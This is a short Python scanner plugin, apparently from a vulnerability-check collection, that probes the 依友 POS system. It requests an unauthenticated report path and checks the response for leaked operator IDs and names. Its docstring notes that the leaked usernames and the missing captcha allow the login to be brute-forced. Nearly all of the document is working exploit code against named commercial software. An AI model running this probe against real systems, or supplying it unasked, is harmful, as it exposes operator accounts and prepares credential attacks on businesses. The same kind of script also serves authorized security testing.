#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 依友POS系统登陆信息泄露
referer: http://www.wooyun.org/bugs/wooyun-2010-0155657
author: Lucifer
description: 依友POS系统用户名列表泄露，且系统无验证码，可暴力破解登陆。
'''
import sys
import requests
import warnings
def run(url):
        result = ['依友POS系统登陆信息泄露','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        payload = "/Code/System/FunRepManage/urlunOper.aspx?rid=0001"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"OperID" in req.text and r"OperName" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
